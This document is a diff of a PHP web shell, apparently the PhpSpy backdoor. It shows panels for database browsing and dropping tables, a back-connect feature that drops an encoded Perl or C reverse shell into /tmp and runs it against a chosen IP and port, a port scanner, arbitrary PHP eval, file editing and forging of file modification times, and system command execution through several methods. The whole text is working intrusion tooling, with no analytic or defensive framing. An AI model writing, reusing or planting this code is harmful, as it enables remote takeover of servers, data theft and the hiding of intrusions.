+						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+						p('<td>'.$row['Key_name'].'</td>');
+						p('<td>'.$row['Index_type'].'</td>');
+						p('<td>'.($row['Non_unique'] ? 'No' : 'Yes').'&nbsp;</td>');
+						p('<td>'.($row['Packed'] === null ? 'No' : $row['Packed']).'&nbsp;</td>');
+						p('<td>'.$row['Seq_in_index'].'</td>');
+						p('<td>'.$row['Column_name'].($row['Sub_part'] ? '('.$row['Sub_part'].')' : '').'&nbsp;</td>');
+						p('<td>'.($row['Cardinality'] ? $row['Cardinality'] : 0).'&nbsp;</td>');
+						p('<td>'.$row['Collation'].'&nbsp;</td>');
+						p('<td>'.$row['Null'].'&nbsp;</td>');
+						p('<td>'.$row['Comment'].'&nbsp;</td>');
+						p('</tr>');
+					}
+					tbfoot();
+				} elseif ($doing == 'insert' || $doing == 'edit') {
+					$result = q('SHOW COLUMNS FROM '.$tablename);
+					while ($row = mysql_fetch_array($result)) {
+						$rowdb[] = $row;
+					}
+					$rs = array();
+					if ($doing == 'insert') {
+						p('<h2>Insert new line in '.$tablename.' table &raquo;</h2>');
+					} else {
+						p('<h2>Update record in '.$tablename.' table &raquo;</h2>');
+						$where = base64_decode($base64);
+						$result = q("SELECT * FROM $tablename WHERE $where LIMIT 1");
+						$rs = mysql_fetch_array($result);
+					}
+					p('<form method="post" action="'.$self.'">');
+					p($dbform);
+					makehide('action','mysqladmin');
+					makehide('tablename',$tablename);
+					p('<table border="0" cellpadding="3" cellspacing="0">');
+					foreach ($rowdb as $row) {
+						if ($rs[$row['Field']]) {
+							$value = htmlspecialchars($rs[$row['Field']]);
+						} else {
+							$value = '';
+						}
+						$thisbg = bg();
+						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+						if ($row['Key'] == 'UNI' || $row['Extra'] == 'auto_increment' || $row['Key'] == 'PRI') {
+							p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td>'.$value.'&nbsp;</td></tr>');
+						} else {
+							p('<td><b>'.$row['Field'].'</b><br />'.$row['Type'].'</td><td><textarea class="area" name="insertsql['.$row['Field'].']" style="width:500px;height:60px;overflow:auto;">'.$value.'</textarea></td></tr>');
+						}
+					}
+					if ($doing == 'insert') {
+						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="insert" value="Insert" /></td></tr>');
+					} else {
+						p('<tr class="'.bg().'"><td colspan="2"><input class="bt" type="submit" name="update" value="Update" /></td></tr>');
+						makehide('base64', $base64);
+					}
+					p('</table></form>');
+				} else {
+					$querys = @explode(';',$sql_query);
+					foreach($querys as $num=>$query) {
+						if ($query) {
+							p("<p><b>Query#{$num} : ".htmlspecialchars($query,ENT_QUOTES)."</b></p>");
+							switch(qy($query))
+							{
+								case 0:
+									p('<h2>Error : '.mysql_error().'</h2>');
+									break;
+								case 1:
+									if (strtolower(substr($query,0,13)) == 'select * from') {
+										$allowedit = 1;
+									}
+									if ($getnumsql) {
+										$tatol = mysql_num_rows(q($getnumsql));
+										$multipage = multi($tatol, $pagenum, $page, $tablename);
+									}
+									if (!$tablename) {
+										$sql_line = str_replace(array("\r", "\n", "\t"), array(' ', ' ', ' '), trim(htmlspecialchars($query)));
+										$sql_line = preg_replace("/\/\*[^(\*\/)]*\*\//i", " ", $sql_line);
+										preg_match_all("/from\s+`{0,1}([\w]+)`{0,1}\s+/i",$sql_line,$matches);
+										$tablename = $matches[1][0];
+									}
 
-								if (!$tatol) {
-									p('<tr class="alt2" onmouseover="this.className=\'focus\';" onmouseout="this.className=\'alt2\';"><td nowrap colspan="'.$fieldnum.'" class="red b">No records</td></tr>');
-								} else {
-									while($mn = $DB->fetch($result)){
+									/*********************/
+									$getfield = q("SHOW COLUMNS FROM $tablename");
+									$rowdb = array();
+									$keyfied = ''; //涓婚敭瀛楁
+									while($row = @mysql_fetch_assoc($getfield)) {
+										$rowdb[$row['Field']]['Key'] = $row['Key'];
+										$rowdb[$row['Field']]['Extra'] = $row['Extra'];
+										if ($row['Key'] == 'UNI' || $row['Key'] == 'PRI') {
+											$keyfied = $row['Field'];
+										}
+									}
+									/*********************/
+									//鐩存帴娴忚琛ㄦ寜鐓т富閿檷搴忔帓鍒�
+									if ($keyfied && strtolower(substr($query,0,13)) == 'select * from') {
+										$query = str_replace(" LIMIT ", " order by $keyfied DESC LIMIT ", $query);
+									}
+
+									$result = q($query);
+
+									p($multipage);
+									p('<table border="0" cellpadding="3" cellspacing="0">');
+									p('<tr class="head">');
+									if ($allowedit) p('<td>Action</td>');
+									$fieldnum = @mysql_num_fields($result);
+									for($i=0;$i<$fieldnum;$i++){
+										$name = @mysql_field_name($result, $i);
+										$type = @mysql_field_type($result, $i);
+										$len = @mysql_field_len($result, $i);
+										p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
+									}
+									p('</tr>');
+
+									while($mn = @mysql_fetch_assoc($result)){
 										$thisbg = bg();
 										p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
-										//读取记录用
+										$where = $tmp = $b1 = '';
+										//閫夊彇鏉′欢瀛楁鐢�
 										foreach($mn as $key=>$inside){
-											p('<td nowrap>'.(($inside == null) ? '<i>null</i>' : html_clean($inside)).'</td>');
+											if ($inside) {
+												//鏌ユ壘涓婚敭銆佸敮涓€灞炴€с€佽嚜鍔ㄥ鍔犵殑瀛楁锛屾壘鍒板氨鍋滄锛屽惁鍒欑粍鍚堟墍鏈夊瓧娈典綔涓烘潯浠躲€�
+												if ($rowdb[$key]['Key'] == 'UNI' || $rowdb[$key]['Extra'] == 'auto_increment' || $rowdb[$key]['Key'] == 'PRI') {
+													$where = $key."='".addslashes($inside)."'";
+													break;
+												}
+												$where .= $tmp.$key."='".addslashes($inside)."'";
+												$tmp = ' AND ';
+											}
 										}
+										//璇诲彇璁板綍鐢�
+										foreach($mn as $key=>$inside){
+											$b1 .= '<td nowrap>'.html_clean($inside).'&nbsp;</td>';
+										}
+										$where = base64_encode($where);
+
+										if ($allowedit) p('<td nowrap><a href="javascript:editrecord(\'edit\', \''.$where.'\', \''.$tablename.'\');">Edit</a> | <a href="javascript:editrecord(\'del\', \''.$where.'\', \''.$tablename.'\');">Del</a></td>');
+
+										p($b1);
 										p('</tr>');
 										unset($b1);
 									}
-								}
-								p('</table>');
-								break;
-							case 2:
-								p('<h2>Affected Rows : '.$DB->affected_rows().'</h2>');
-								break;
+									p('<tr class="head">');
+									if ($allowedit) p('<td>Action</td>');
+									$fieldnum = @mysql_num_fields($result);
+									for($i=0;$i<$fieldnum;$i++){
+										$name = @mysql_field_name($result, $i);
+										$type = @mysql_field_type($result, $i);
+										$len = @mysql_field_len($result, $i);
+										p("<td nowrap>$name<br><span>$type($len)".(($rowdb[$name]['Key'] == 'UNI' || $rowdb[$name]['Key'] == 'PRI') ? '<b> - PRIMARY</b>' : '').($rowdb[$name]['Extra'] == 'auto_increment' ? '<b> - Auto</b>' : '')."</span></td>");
+									}
+									p('</tr>');
+									tbfoot();
+									p($multipage);
+									break;
+								case 2:
+									$ar = mysql_affected_rows();
+									p('<h2>affected rows : <b>'.$ar.'</b></h2>');
+									break;
+							}
 						}
 					}
 				}
 			} else {
-				$query = $DB->query("SHOW TABLE STATUS");
+				$query = q("SHOW TABLE STATUS");
 				$table_num = $table_rows = $data_size = 0;
 				$tabledb = array();
-				while($table = $DB->fetch($query)) {
+				while($table = mysql_fetch_array($query)) {
 					$data_size = $data_size + $table['Data_length'];
 					$table_rows = $table_rows + $table['Rows'];
+					$table['Data_length'] = sizecount($table['Data_length']);
 					$table_num++;
 					$tabledb[] = $table;
 				}
 				$data_size = sizecount($data_size);
 				unset($table);
-				if (count($tabledb)) {
-					if ($highver) {
-						$db_engine = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'storage_engine';"));
-						$db_collation = $DB->fetch($DB->query("SHOW VARIABLES LIKE 'collation_database';"));
-					}
-					$sort = array('Name', 1);
-					if($order) {
-						if(preg_match('!s_([A-z_]+)_(\d{1})!', $order, $match)) {
-							$sort = array($match[1], (int)$match[2]);
-						}
-					}
-					usort($tabledb, 'cmp');
-					p('<table border="0" cellpadding="0" cellspacing="0" id="lists">');
-					p('<tr class="head">');
-					p('<td width="2%"><input name="chkall" value="on" type="checkbox" onclick="checkall(this.form)" /></td>');
-					p('<td><a href="javascript:setsort(\'s_Name_'.($sort[1]?0:1).'\');">Name</a> '.($order == 's_Name_0' ? $dchar : '').($order == 's_Name_1' || !$order ? $uchar : '').'</td>');
-					p('<td><a href="javascript:setsort(\'s_Rows_'.($sort[1]?0:1).'\');">Rows</a>'.($order == 's_Rows_0' ? $dchar : '').($order == 's_Rows_1' ? $uchar : '').'</td>');
-					p('<td><a href="javascript:setsort(\'s_Data_length_'.($sort[1]?0:1).'\');">Data_length</a>'.($order == 's_Data_length_0' ? $dchar : '').($order == 's_Data_length_1' ? $uchar : '').'</td>');
-					p('<td><a href="javascript:setsort(\'s_Create_time_'.($sort[1]?0:1).'\');">Create_time</a>'.($order == 's_Create_time_0' ? $dchar : '').($order == 's_Create_time_1' ? $uchar : '').'</td>');
-					p('<td><a href="javascript:setsort(\'s_Update_time_'.($sort[1]?0:1).'\');">Update_time</a>'.($order == 's_Update_time_0' ? $dchar : '').($order == 's_Update_time_1' ? $uchar : '').'</td>');
-					if ($highver) {
-						p('<td>Engine</td>');
-						p('<td>Collation</td>');
-					}
-					p('<td>Other</td>');
-					p('</tr>');
-					foreach ($tabledb as $key => $table) {
-						$thisbg = bg();
-						p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
-						p('<td align="center" width="2%"><input type="checkbox" name="bak_table[]" value="'.$table['Name'].'" /></td>');
-						p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
-						p('<td>'.$table['Rows'].'&nbsp;</td>');
-						p('<td>'.sizecount($table['Data_length']).'</td>');
-						p('<td>'.$table['Create_time'].'&nbsp;</td>');
-						p('<td>'.$table['Update_time'].'&nbsp;</td>');
-						if ($highver) {
-							p('<td>'.$table['Engine'].'</td>');
-							p('<td>'.$table['Collation'].'</td>');
-						}
-						p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a></td>');
-						p('</tr>');
-					}
-					p('<tr class="head">');
-					p('<td width="2%">&nbsp;</td>');
-					p('<td>'.$table_num.' table(s)</td>');
-					p('<td>'.$table_rows.'</td>');
-					p('<td>'.$data_size.'</td>');
-					p('<td>&nbsp;</td>');
-					p('<td>&nbsp;</td>');
-					if ($highver) {
-						p('<td>'.$db_engine['Value'].'</td>');
-						p('<td>'.$db_collation['Value'].'</td>');
-					}
-					p('<td>&nbsp;</td>');
-					p('</tr>');
-					p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"bak_path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"button\" value=\"Export selection table\" onclick=\"$('doing').value='dump';$('dbform').submit();\" /></td></tr>");
-					p("</table>");
-				} else {
-					p('<p class="red b">No tables</p>');
+				p('<table border="0" cellpadding="0" cellspacing="0">');
+				p('<form action="'.$self.'" method="POST">');
+				makehide('action','mysqladmin');
+				p($dbform);
+				p('<tr class="head">');
+				p('<td width="2%" align="center">&nbsp;</td>');
+				p('<td>Name</td>');
+				p('<td>Rows</td>');
+				p('<td>Data_length</td>');
+				p('<td>Create_time</td>');
+				p('<td>Update_time</td>');
+				if ($highver) {
+					p('<td>Engine</td>');
+					p('<td>Collation</td>');
 				}
-				$DB->free_result($query);
+				p('<td>Operate</td>');
+				p('</tr>');
+				foreach ($tabledb as $key => $table) {
+					$thisbg = bg();
+					p('<tr class="'.$thisbg.'" onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$thisbg.'\';">');
+					p('<td align="center" width="2%"><input type="checkbox" name="table[]" value="'.$table['Name'].'" /></td>');
+					p('<td><a href="javascript:settable(\''.$table['Name'].'\');">'.$table['Name'].'</a></td>');
+					p('<td>'.$table['Rows'].'</td>');
+					p('<td>'.$table['Data_length'].'</td>');
+					p('<td>'.$table['Create_time'].'&nbsp;</td>');
+					p('<td>'.$table['Update_time'].'&nbsp;</td>');
+					if ($highver) {
+						p('<td>'.$table['Engine'].'</td>');
+						p('<td>'.$table['Collation'].'</td>');
+					}
+					p('<td><a href="javascript:settable(\''.$table['Name'].'\', \'insert\');">Insert</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'structure\');">Structure</a> | <a href="javascript:settable(\''.$table['Name'].'\', \'drop\');">Drop</a></td>');
+					p('</tr>');
+				}
+				p('<tr class="head">');
+				p('<td width="2%" align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td>');
+				p('<td>Name</td>');
+				p('<td>Rows</td>');
+				p('<td>Data_length</td>');
+				p('<td>Create_time</td>');
+				p('<td>Update_time</td>');
+				if ($highver) {
+					p('<td>Engine</td>');
+					p('<td>Collation</td>');
+				}
+				p('<td>Operate</td>');
+				p('</tr>');
+				p('<tr class='.bg().'>');
+				p('<td>&nbsp;</td>');
+				p('<td>Total tables: '.$table_num.'</td>');
+				p('<td>'.$table_rows.'</td>');
+				p('<td>'.$data_size.'</td>');
+				p('<td colspan="'.($highver ? 5 : 3).'">&nbsp;</td>');
+				p('</tr>');
+
+				p("<tr class=\"".bg()."\"><td colspan=\"".($highver ? 9 : 7)."\"><input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /> Save as file <input class=\"input\" name=\"path\" value=\"".SA_ROOT.$dbname.".sql\" type=\"text\" size=\"60\" /> <input class=\"bt\" type=\"submit\" value=\"Export selection table\" /></td></tr>");
+				makehide('doing','backupmysql');
+				formfoot();
+				p("</table>");
+				fr($query);
 			}
 		}
-		$DB->close();
 	}
-	formfoot();
+	tbfoot();
+	@mysql_close();
 }//end mysql
 
-elseif ($act == 'backconnect') {
-
-	!$p2 && $p2 = $_SERVER['REMOTE_ADDR'];
-	!$p3 && $p3 = '12345';
+elseif ($action == 'backconnect') {
+	!$yourip && $yourip = $_SERVER['REMOTE_ADDR'];
+	!$yourport && $yourport = '12345';
 	$usedb = array('perl'=>'perl','c'=>'c');
 
 	$back_connect="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj".
@@ -854,54 +1271,56 @@ elseif ($act == 'backconnect') {
 		"QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp".
 		"Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
 
-	if ($p1 == 'start' && $p2 && $p3 && $p4){
-		if ($p4 == 'perl') {
+	if ($start && $yourip && $yourport && $use){
+		if ($use == 'perl') {
 			cf('/tmp/angel_bc',$back_connect);
-			$res = execute(which('perl')." /tmp/angel_bc ".$p2." ".$p3." &");
+			$res = execute(which('perl')." /tmp/angel_bc $yourip $yourport &");
 		} else {
 			cf('/tmp/angel_bc.c',$back_connect_c);
 			$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
 			@unlink('/tmp/angel_bc.c');
-			$res = execute("/tmp/angel_bc ".$p2." ".$p3." &");
+			$res = execute("/tmp/angel_bc $yourip $yourport &");
 		}
-		m('Now script try connect to '.$p2.':'.$p3.' ...');
+		m("Now script try connect to $yourip port $yourport ...");
 	}
 
-	formhead(array('title'=>'Back Connect', 'onsubmit'=>'g(\'backconnect\',null,\'start\',this.p2.value,this.p3.value,this.p4.value);return false;'));
+	formhead(array('title'=>'Back Connect'));
+	makehide('action','backconnect');
 	p('<p>');
 	p('Your IP:');
-	makeinput(array('name'=>'p2','size'=>20,'value'=>$p2));
+	makeinput(array('name'=>'yourip','size'=>20,'value'=>$yourip));
 	p('Your Port:');
-	makeinput(array('name'=>'p3','size'=>15,'value'=>$p3));
+	makeinput(array('name'=>'yourport','size'=>15,'value'=>$yourport));
 	p('Use:');
-	makeselect(array('name'=>'p4','option'=>$usedb,'selected'=>$p4));
-	makeinput(array('value'=>'Start','type'=>'submit','class'=>'bt'));
+	makeselect(array('name'=>'use','option'=>$usedb,'selected'=>$use));
+	makeinput(array('name'=>'start','value'=>'Start','type'=>'submit','class'=>'bt'));
 	p('</p>');
 	formfoot();
 }//end
 
-elseif ($act == 'portscan') {
-	!$p2 && $p2 = '127.0.0.1';
-	!$p3 && $p3 = '21,80,135,139,445,1433,3306,3389,5631,43958';
-	formhead(array('title'=>'Port Scan', 'onsubmit'=>'g(\'portscan\',null,\'start\',this.p2.value,this.p3.value);return false;'));
+elseif ($action == 'portscan') {
+	!$scanip && $scanip = '127.0.0.1';
+	!$scanport && $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
+	formhead(array('title'=>'Port Scan'));
+	makehide('action','portscan');
 	p('<p>');
 	p('IP:');
-	makeinput(array('name'=>'p2','size'=>20,'value'=>$p2));
+	makeinput(array('name'=>'scanip','size'=>20,'value'=>$scanip));
 	p('Port:');
-	makeinput(array('name'=>'p3','size'=>80,'value'=>$p3));
-	makeinput(array('value'=>'Scan','type'=>'submit','class'=>'bt'));
+	makeinput(array('name'=>'scanport','size'=>80,'value'=>$scanport));
+	makeinput(array('name'=>'startscan','value'=>'Scan','type'=>'submit','class'=>'bt'));
 	p('</p>');
 	formfoot();
 
-	if ($p1 == 'start') {
+	if ($startscan) {
 		p('<h2>Result &raquo;</h2>');
 		p('<ul class="info">');
-		foreach(explode(',', $p3) as $port) {
-			$fp = @fsockopen($p2, $port, $errno, $errstr, 1);
+		foreach(explode(',', $scanport) as $port) {
+			$fp = @fsockopen($scanip, $port, &$errno, &$errstr, 1);
 			if (!$fp) {
-				p('<li>'.$p2.':'.$port.' ------------------------ <span class="b">Close</span></li>');
+				p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#f00;">Close</span></li>');
 		   } else {
-				p('<li>'.$p2.':'.$port.' ------------------------ <span class="red b">Open</span></li>');
+				p('<li>'.$scanip.':'.$port.' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>');
 				@fclose($fp);
 		   }
 		}
@@ -909,82 +1328,140 @@ elseif ($act == 'portscan') {
 	}
 }
 
-elseif ($act == 'eval') {
-	$phpcode = trim($p1);
+elseif ($action == 'eval') {
+	$phpcode = trim($phpcode);
 	if($phpcode){
 		if (!preg_match('#<\?#si', $phpcode)) {
 			$phpcode = "<?php\n\n{$phpcode}\n\n?>";
 		}
 		eval("?".">$phpcode<?");
 	}
-	formhead(array('title'=>'Eval PHP Code', 'onsubmit'=>'g(\'eval\',null,this.p1.value);return false;'));
-	maketext(array('title'=>'PHP Code','name'=>'p1', 'value'=>$phpcode));
-	p('<p><a href="http://w'.'ww.4'.'ng'.'el.net/php'.'sp'.'y/pl'.'ugin/" target="_blank">Get plugins</a></p>');
+	formhead(array('title'=>'Eval PHP Code'));
+	makehide('action','eval');
+	maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
+	p('<p><a href="http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/" target="_blank">Get plugins</a></p>');
 	formfooter();
 }//end eval
 
-elseif ($act == 'editfile') {
-
-	// 编辑文件
-	if ($p1 == 'edit' && $p2 && $p3) {
-		$fp = @fopen($p2,'w');
-		m('Save file '.(@fwrite($fp,$p3) ? 'success' : 'failed'));
-		@fclose($fp);
-	}
-	$contents = '';
-	if(file_exists($p2)) {
-		$fp=@fopen($p2,'r');
-		$contents=@fread($fp, filesize($p2));
+elseif ($action == 'editfile') {
+	if(file_exists($opfile)) {
+		$fp=@fopen($opfile,'r');
+		$contents=@fread($fp, filesize($opfile));
 		@fclose($fp);
 		$contents=htmlspecialchars($contents);
 	}
-	formhead(array('title'=>'Create / Edit File', 'onsubmit'=>'g(\'editfile\',null,\'edit\',this.p2.value,this.p3.value);return false;'));
-	makeinput(array('title'=>'Filename','name'=>'p2','value'=>$p2,'newline'=>1));
-	maketext(array('title'=>'File Content','name'=>'p3','value'=>$contents));
+	formhead(array('title'=>'Create / Edit File'));
+	makehide('action','file');
+	makehide('dir',$nowpath);
+	makeinput(array('title'=>'Current File (import new file name and new file)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
+	maketext(array('title'=>'File Content','name'=>'filecontent','value'=>$contents));
 	formfooter();
+
 	goback();
 
 }//end editfile
 
-elseif ($act == 'newtime') {
-	$filemtime = @filemtime($p1);
-
-	formhead(array('title'=>'Clone folder/file was last modified time', 'onsubmit'=>'g(\'file\',null,\'clonetime\',this.p2.value,this.p3.value);return false;'));
-	makeinput(array('title'=>'Alter folder/file','name'=>'p2','value'=>$p1,'size'=>120,'newline'=>1));
-	makeinput(array('title'=>'Reference folder/file','name'=>'p3','value'=>$cwd,'size'=>120,'newline'=>1));
+elseif ($action == 'newtime') {
+	$opfilemtime = @filemtime($opfile);
+	//$time = strtotime("$year-$month-$day $hour:$minute:$second");
+	$cachemonth = array('January'=>1,'February'=>2,'March'=>3,'April'=>4,'May'=>5,'June'=>6,'July'=>7,'August'=>8,'September'=>9,'October'=>10,'November'=>11,'December'=>12);
+	formhead(array('title'=>'Clone folder/file was last modified time'));
+	makehide('action','file');
+	makehide('dir',$nowpath);
+	makeinput(array('title'=>'Alter folder/file','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
+	makeinput(array('title'=>'Reference folder/file (fullpath)','name'=>'tarfile','size'=>120,'newline'=>1));
 	formfooter();
-
-	formhead(array('title'=>'Set last modified', 'onsubmit'=>'g(\'file\',null,\'settime\',this.p2.value,this.p3.value);return false;'));
-	makeinput(array('title'=>'Current folder/file','name'=>'p2','value'=>$p1,'size'=>120,'newline'=>1));
-	makeinput(array('title'=>'Modify time','name'=>'p3','value'=>date("Y-m-d H:i:s", $filemtime),'size'=>120,'newline'=>1));
+	formhead(array('title'=>'Set last modified'));
+	makehide('action','file');
+	makehide('dir',$nowpath);
+	makeinput(array('title'=>'Current folder/file (fullpath)','name'=>'curfile','value'=>$opfile,'size'=>120,'newline'=>1));
+	p('<p>year:');
+	makeinput(array('name'=>'year','value'=>date('Y',$opfilemtime),'size'=>4));
+	p('month:');
+	makeinput(array('name'=>'month','value'=>date('m',$opfilemtime),'size'=>2));
+	p('day:');
+	makeinput(array('name'=>'day','value'=>date('d',$opfilemtime),'size'=>2));
+	p('hour:');
+	makeinput(array('name'=>'hour','value'=>date('H',$opfilemtime),'size'=>2));
+	p('minute:');
+	makeinput(array('name'=>'minute','value'=>date('i',$opfilemtime),'size'=>2));
+	p('second:');
+	makeinput(array('name'=>'second','value'=>date('s',$opfilemtime),'size'=>2));
+	p('</p>');
 	formfooter();
-
 	goback();
 }//end newtime
 
-elseif ($act == 'shell') {
-	formhead(array('title'=>'Execute Command', 'onsubmit'=>'g(\'shell\',null,this.p1.value);return false;'));
+elseif ($action == 'shell') {
+	if (IS_WIN && IS_COM) {
+		if($program && $parameter) {
+			$shell= new COM('Shell.Application');
+			$a = $shell->ShellExecute($program,$parameter);
+			m('Program run has '.(!$a ? 'success' : 'fail'));
+		}
+		!$program && $program = 'c:\windows\system32\cmd.exe';
+		!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';
+		formhead(array('title'=>'Execute Program'));
+		makehide('action','shell');
+		makeinput(array('title'=>'Program','name'=>'program','value'=>$program,'newline'=>1));
+		p('<p>');
+		makeinput(array('title'=>'Parameter','name'=>'parameter','value'=>$parameter));
+		makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
+		p('</p>');
+		formfoot();
+	}
+	formhead(array('title'=>'Execute Command'));
+	makehide('action','shell');
+	if (IS_WIN && IS_COM) {
+		$execfuncdb = array('phpfunc'=>'phpfunc','wscript'=>'wscript','proc_open'=>'proc_open');
+		makeselect(array('title'=>'Use:','name'=>'execfunc','option'=>$execfuncdb,'selected'=>$execfunc,'newline'=>1));
+	}
 	p('<p>');
-	makeinput(array('name'=>'p1','value'=>htmlspecialchars($p1)));
-	makeinput(array('class'=>'bt','type'=>'submit','value'=>'Execute'));
+	makeinput(array('title'=>'Command','name'=>'command','value'=>htmlspecialchars($command)));
+	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
 	p('</p>');
 	formfoot();
 
-	if ($p1) {
-		p('<pre>'.execute($p1).'</pre>');
+	if ($command) {
+		p('<hr width="100%" noshade /><pre>');
+		if ($execfunc=='wscript' && IS_WIN && IS_COM) {
+			$wsh = new COM('WScript.shell');
+			$exec = $wsh->exec('cmd.exe /c '.$command);
+			$stdout = $exec->StdOut();
+			$stroutput = $stdout->ReadAll();
+			echo $stroutput;
+		} elseif ($execfunc=='proc_open' && IS_WIN && IS_COM) {
+			$descriptorspec = array(
+			   0 => array('pipe', 'r'),
+			   1 => array('pipe', 'w'),
+			   2 => array('pipe', 'w')
+			);
+			$process = proc_open($_SERVER['COMSPEC'], $descriptorspec, $pipes);
+			if (is_resource($process)) {
+				fwrite($pipes[0], $command."\r\n");
+				fwrite($pipes[0], "exit\r\n");
+				fclose($pipes[0]);
+				while (!feof($pipes[1])) {
+					echo fgets($pipes[1], 1024);
+				}
+				fclose($pipes[1]);
+				while (!feof($pipes[2])) {
+					echo fgets($pipes[2], 1024);
+				}
+				fclose($pipes[2]);
+				proc_close($process);
+			}
+		} else {
+			echo(execute($command));
+		}
+		p('</pre>');
 	}
 }//end shell
 
-elseif ($act == 'phpenv') {
-	$d=array();
-	if(function_exists('mysql_get_client_info'))
-		$d[] = "MySql (".mysql_get_client_info().")";
-	if(function_exists('mssql_connect'))
-		$d[] = "MSSQL";
-	if(function_exists('pg_connect'))
-		$d[] = "PostgreSQL";
-	if(function_exists('oci_connect'))
-		$d[] = "Oracle";
+elseif ($action == 'phpenv') {
+	$upsize=getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed';
+	$adminmail=isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from');
+	!$dis_func && $dis_func = 'No';
 	$info = array(
 		1 => array('Server Time',date('Y/m/d h:i:s',$timestamp)),
 		2 => array('Server Domain',$_SERVER['SERVER_NAME']),
@@ -999,7 +1476,7 @@ elseif ($act == 'phpenv') {
 		10 => array('PHP Version',PHP_VERSION),
 		11 => array('PHPINFO',(IS_PHPINFO ? '<a href="javascript:g(\'phpinfo\');">Yes</a>' : 'No')),
 		12 => array('Safe Mode',getcfg('safe_mode')),
-		13 => array('Administrator',(isset($_SERVER['SERVER_ADMIN']) ? $_SERVER['SERVER_ADMIN'] : getcfg('sendmail_from'))),
+		13 => array('Administrator',$adminmail),
 		14 => array('allow_url_fopen',getcfg('allow_url_fopen')),
 		15 => array('enable_dl',getcfg('enable_dl')),
 		16 => array('display_errors',getcfg('display_errors')),
@@ -1007,15 +1484,19 @@ elseif ($act == 'phpenv') {
 		18 => array('magic_quotes_gpc',getcfg('magic_quotes_gpc')),
 		19 => array('memory_limit',getcfg('memory_limit')),
 		20 => array('post_max_size',getcfg('post_max_size')),
-		21 => array('upload_max_filesize',(getcfg('file_uploads') ? getcfg('upload_max_filesize') : 'Not allowed')),
+		21 => array('upload_max_filesize',$upsize),
 		22 => array('max_execution_time',getcfg('max_execution_time').' second(s)'),
-		23 => array('disable_functions',($dis_func ? $dis_func : 'No')),
-		24 => array('Supported databases',implode(', ', $d)),
-		25 => array('cURL support',function_exists('curl_version') ? 'Yes' : 'No'),
-		26 => array('Open base dir',getcfg('open_basedir')),
-		27 => array('Safe mode exec dir',getcfg('safe_mode_exec_dir')),
-		28 => array('Safe mode include dir',getcfg('safe_mode_include_dir')),
+		23 => array('disable_functions',$dis_func),
 	);
+
+	if($phpvarname) {
+		m($phpvarname .' : '.getcfg($phpvarname));
+	}
+
+	formhead(array('title'=>'Server environment'));
+	makehide('action','phpenv');
+	makeinput(array('title'=>'Please input PHP configuration parameter(eg:magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
+	formfooter();
 
 	$hp = array(0=> 'Server', 1=> 'PHP');
 	for($a=0;$a<2;$a++) {
@@ -1026,7 +1507,7 @@ elseif ($act == 'phpenv') {
 				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
 			}
 		} elseif ($a == 1) {
-			for($i=10;$i<=25;$i++) {
+			for($i=10;$i<=23;$i++) {
 				p('<li><u>'.$info[$i][0].':</u>'.$info[$i][1].'</li>');
 			}
 		}
@@ -1034,7 +1515,24 @@ elseif ($act == 'phpenv') {
 	}
 }//end phpenv
 
-elseif ($act == 'secinfo') {
+elseif ($action == 'secinfo') {
+
+	secparam('Server software', @getenv('SERVER_SOFTWARE'));
+	secparam('Disabled PHP Functions', ($GLOBALS['disable_functions'])?$GLOBALS['disable_functions']:'none');
+	secparam('Open base dir', @ini_get('open_basedir'));
+	secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
